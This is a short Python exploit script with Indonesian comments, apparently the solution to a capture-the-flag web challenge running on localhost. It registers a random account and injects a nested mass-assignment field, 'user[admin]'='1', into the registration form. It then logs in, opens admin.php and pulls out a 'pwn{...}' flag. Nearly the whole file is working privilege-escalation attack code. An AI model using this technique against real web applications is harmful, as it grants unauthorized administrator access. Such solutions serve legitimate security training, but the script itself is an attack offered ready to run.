import requests
import random
import string
import re

# Port 1337 (Sesuai yml terakhir)
URL = "http://localhost:1337"

def exploit():
    s = requests.Session()
    
    # 1. Bikin User Random
    username = ''.join(random.choices(string.ascii_lowercase, k=8))
    password = "password123"
    print(f"[*] Target: {URL}")
    print(f"[*] Attempting Nested Mass Assignment as: {username}")
    
    # 2. Payload Register Jahat (Nested Array)
    # Form aslinya pake name="user[username]"
    # Kita tambah user[admin] = 1
    payload = {
        'user[username]': username,
        'user[password]': password,
        'user[admin]': '1'  # <--- INI KUNCINYA
    }
    
    try:
        # Register
        r = s.post(f"{URL}/register.php", data=payload)
        
        # 3. Login
        print("[*] Logging in...")
        s.post(f"{URL}/auth.php", data={
            'username': username,
            'password': password
        })
        
        # 4. Akses Admin Page (Bukan dashboard.php, tapi admin.php)
        r = s.get(f"{URL}/admin.php")
        
        if r.status_code == 200:
            print("[+] Admin Page Accessed!")
            
            # Cari Flag di dalam tag <pre>
            if "Administrative Access Granted" in r.text:
                print("[+] Admin Privileges Confirmed!")
                
                flag = re.search(r'pwn\{.*?\}', r.text)
                if flag:
                    print(f"\n[!!!] FLAG FOUND: {flag.group(0)}\n")
                else:
                    print("[-] Flag regex failed. Raw content:")
                    print(r.text)
            else:
                print("[-] Login success but not Admin (Check payload).")
        else:
            print(f"[-] Access Failed. Status: {r.status_code}")
            # print(r.text)

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()
